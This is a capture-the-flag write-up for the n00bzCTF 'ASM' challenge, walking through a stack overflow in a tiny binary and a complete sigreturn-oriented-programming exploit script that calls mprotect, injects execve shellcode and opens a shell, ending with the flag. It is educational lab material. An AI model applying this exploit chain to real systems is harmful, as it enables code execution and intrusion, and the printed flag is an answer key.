# n00bzCTF 

## ASM
> What can I say except, "You're welcome" :)
> Author: NoobHacker

`nc challs.n00bzunit3d.xyz 38894`
Challenge file: [srop_me](https://github.com/4n0nym4u5/CTF-Writeups/blob/main/n00bzCTF/ASM/srop_me)
Points: 489
Solves: 52

### checksec
```yaml
➜ pwn checksec srop_me                 
[*] '/home/n00bzCTF/ASM/srop_me'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```
The binary is very simple and after taking a look at the binary in IDA, we can then move to the exploitation part of the challenge.
```c
__int64 start()
	call    vuln
	mov     eax, 3Ch ; '<'
	mov     edi, 0          ; error_code
	syscall                 ; LINUX - sys_exit
	retn
```
```c
__int64 vuln()
	mov     eax, 1
	mov     edi, 1          ; fd
	mov     rsi, offset msg ; buf
	mov     edx, 0Fh        ; count
	syscall                 ; LINUX - sys_write
	sub     rsp, 20h
	mov     eax, 0
	mov     edi, 0          ; fd
	mov     rsi, rsp        ; buf
	mov     edx, 200h       ; count
	syscall                 ; LINUX - sys_read
	add     rsp, 20h
	retn
 ```
The `start` function calls the `vuln` function.
The vuln function does two things.

 1. Print out `Hello, world!!` string to stdout.
 2. Prompts the user for input
`edx` stores the number of maximum bytes to input for the read syscall. And the edx value exceeds the buffer value.
Let's check out the function in decompiled mode for a better understanding.

```c
signed __int64 vuln()
{
  signed __int64 v0; // rax
  char v2; // [rsp-20h] [rbp-20h] BYREF

  v0 = sys_write(1u, &msg, 0xFuLL);
  return sys_read(0, &v2, 0x200uLL);
}  
```
We can see an obvious stack overflow. And as per the checksec output above we can easily achieve RIP control over this program.
```
pwndbg> r

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.archlinux.org>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
Hello, world!!
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaac

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401037 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────
*RAX  0x200
 RBX  0x0
*RCX  0x401033 (vuln+51) ◂— add rsp, 0x20
*RDX  0x200
 RDI  0x0
*RSI  0x7fffffffdce8 ◂— 0x6161616161616161 ('aaaaaaaa')
 R8   0x0
 R9   0x0
 R10  0x0
*R11  0x206
 R12  0x0
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0x0
*RSP  0x7fffffffdd08 ◂— 0x6161616161616165 ('eaaaaaaa')
*RIP  0x401037 (vuln+55) ◂— ret 
──────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────
   0x401033 <vuln+51>    add    rsp, 0x20
 ► 0x401037 <vuln+55>    ret    <0x6161616161616165>









───────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdd08 ◂— 0x6161616161616165 ('eaaaaaaa')
01:0008│     0x7fffffffdd10 ◂— 0x6161616161616166 ('faaaaaaa')
02:0010│     0x7fffffffdd18 ◂— 0x6161616161616167 ('gaaaaaaa')
03:0018│     0x7fffffffdd20 ◂— 0x6161616161616168 ('haaaaaaa')
04:0020│     0x7fffffffdd28 ◂— 0x6161616161616169 ('iaaaaaaa')
05:0028│     0x7fffffffdd30 ◂— 0x616161616161616a ('jaaaaaaa')
06:0030│     0x7fffffffdd38 ◂— 0x616161616161616b ('kaaaaaaa')
07:0038│     0x7fffffffdd40 ◂— 0x616161616161616c ('laaaaaaa')
─────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────
 ► f 0         0x401037 vuln+55
   f 1 0x6161616161616165
   f 2 0x6161616161616166
   f 3 0x6161616161616167
   f 4 0x6161616161616168
   f 5 0x6161616161616169
   f 6 0x616161616161616a
   f 7 0x616161616161616b
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```
```python
➜  pwn cyclic -n 8 -o 0x6161616161616165                  
32
```
Now that we have `RIP` control and the offset lets build a rop chain.
```yaml
➜ xgadget srop_me
TARGET 0 - 'srop_me': ELF-X64, 0x00000000401038 entry, 74/1 executable bytes/segments 

0x00000000401028: add [rax-0x77], cl; out 0xba, al; add [rdx], al; add [rax], al; syscall; 
0x0000000040100c: add [rax], ah; add [rax], al; add [rax], al; add [rdx+0xf], bh; syscall; 
0x0000000040100e: add [rax], al; add [rax], al; add [rdx+0xf], bh; syscall; 
0x00000000401010: add [rax], al; add [rax], al; mov edx, 0xf; syscall; 
0x00000000401025: add [rax], al; add [rax], al; mov rsi, rsp; mov edx, 0x200; syscall; 
0x00000000401043: add [rax], al; add [rax], al; syscall; 
0x00000000401002: add [rax], al; add [rdi+0x1], bh; mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x00000000401021: add [rax], al; add [rdi], bh; mov rsi, rsp; mov edx, 0x200; syscall; 
0x0000000040103f: add [rax], al; add [rdi], bh; syscall; 
0x00000000401011: add [rax], al; add [rdx+0xf], bh; syscall; 
0x00000000401022: add [rax], al; mov edi, 0x0; mov rsi, rsp; mov edx, 0x200; syscall; 
0x00000000401040: add [rax], al; mov edi, 0x0; syscall; 
0x00000000401003: add [rax], al; mov edi, 0x1; mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x00000000401012: add [rax], al; mov edx, 0xf; syscall; 
0x00000000401008: add [rax], al; mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x00000000401027: add [rax], al; mov rsi, rsp; mov edx, 0x200; syscall; 
0x00000000401017: add [rax], al; syscall; 
0x00000000401006: add [rax], eax; add [rax], al; mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x00000000401004: add [rdi+0x1], bh; mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x00000000401023: add [rdi], bh; mov rsi, rsp; mov edx, 0x200; syscall; 
0x00000000401041: add [rdi], bh; syscall; 
0x00000000401030: add [rdi], cl; add eax, 0x20c48348; ret; 
0x00000000401013: add [rdx+0xf], bh; syscall; 
0x0000000040102d: add [rdx], al; add [rax], al; syscall; 
0x0000000040102e: add al, [rax]; add [rdi], cl; add eax, 0x20c48348; ret; 
0x00000000401032: add eax, 0x20c48348; ret; 
0x00000000401034: add esp, 0x20; ret; 
0x00000000401033: add rsp, 0x20; ret; 
0x0000000040100d: and [rax], al; add [rax], al; add [rax], al; mov edx, 0xf; syscall; 
0x0000000040101e: and [rax], bh; mov edi, 0x0; mov rsi, rsp; mov edx, 0x200; syscall; 
0x0000000040103e: cmp al, 0x0; add [rax], al; mov edi, 0x0; syscall; 
0x0000000040101f: mov eax, 0x0; mov edi, 0x0; mov rsi, rsp; mov edx, 0x200; syscall; 
0x00000000401000: mov eax, 0x1; mov edi, 0x1; mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x0000000040103d: mov eax, 0x3c; mov edi, 0x0; syscall; 
0x00000000401024: mov edi, 0x0; mov rsi, rsp; mov edx, 0x200; syscall; 
0x00000000401042: mov edi, 0x0; syscall; 
0x00000000401005: mov edi, 0x1; mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x0000000040102c: mov edx, 0x200; syscall; 
0x00000000401014: mov edx, 0xf; syscall; 
0x0000000040100b: mov esi, 0x402000; add [rax], al; add [rax], al; mov edx, 0xf; syscall; 
0x0000000040102a: mov esi, esp; mov edx, 0x200; syscall; 
0x0000000040100a: mov rsi, 0x402000; mov edx, 0xf; syscall; 
0x00000000401029: mov rsi, rsp; mov edx, 0x200; syscall; 
0x0000000040102b: out 0xba, al; add [rdx], al; add [rax], al; syscall; 
0x00000000401037: ret; 
0x00000000401019: syscall; 

CONFIG [ search: ROP-JOP-SYS (default), x_match: none, max_len: 5, syntax: Intel, regex_filter: none ]
RESULT [ unique_gadgets: 46, search_time: 1.256256ms, print_time: 7.85928ms ]
```
As the name of the file indicates the author wants us to use the SROP technique to solve this challenge. This challenge is just a introductory SROP challenge.
If you want to understand SROP from the depth check this blog
https://rog3rsm1th.github.io/posts/sigreturn-oriented-programming/

But you need to find a way to set `RAX` register to `0xf` for the Sigreturn syscall. Luckily you can use the availibility of `read` syscall in the binary. The return value of the syscall is stored in `RAX` register and the return value for a read syscall is the length of the input provided. In the same way the return value of write syscall is the length of the string displayed. With this principle we can use the read syscall to make the `RAX` register to `0xf`  . 
We will use mprotect syscall with the sigreturn to create a RWX region in the binary to read out shellcode to get a shell.
The structure of the exploit looks like this
![exploit struct](https://i.imgur.com/LZGcKo4.png)

The exploit consists of three stages

 1. **First stage:** Overflow buffer , setup the stack and SigreturnFrame.
 2. **Second stage:** Send junk input of length 15 to setup RAX.
 3. **Third stage:** Send the shellcode that pops a shell, Overflow the buffer and ret2shellcode.

```py
#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./srop_me")
host = args.HOST or "challs.n00bzunit3d.xyz"
port = int(args.PORT or 38894)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()

padding = b"A" * 32
call_read_sub_rsp = 0x40101F
syscall_ret_addr = 0x401047
fake_rwx_addr = 0x401540
rwx_addr = 0x401000
shellcode_addr = fake_rwx_addr - 0x20

rop1 = padding
rop1 += p(call_read_sub_rsp)
rop1 += padding
rop1 += p(syscall_ret_addr)


"""
Name            : mprotect
rax             : 0x0a
rdi             : unsigned long start
rsi             : size_t len
rdx             : unsigned long prot
rcx             : -
r8              : -
r9              : -
Definition      : mm/mprotect.c
"""

mprotect_frame = SigreturnFrame()
mprotect_frame.rip = 0x401019  # Do syscall and continue the program by reading our input to shellcode_addr
mprotect_frame.rsp = fake_rwx_addr
mprotect_frame.rax = 0xA
mprotect_frame.rdi = 0x401000
mprotect_frame.rsi = 0x1000
mprotect_frame.rdx = 7

s(rop1 + bytes(mprotect_frame))

pause()

s(b"A" * 15)

pause()

s(
    asm(execve_x64) + p(shellcode_addr)
)  # shellcode length = 32 bytes. so equal to the padding length

io.interactive()
```
> FLAG : n00bz{SR0P_1$_s0_fun_r1ght??!}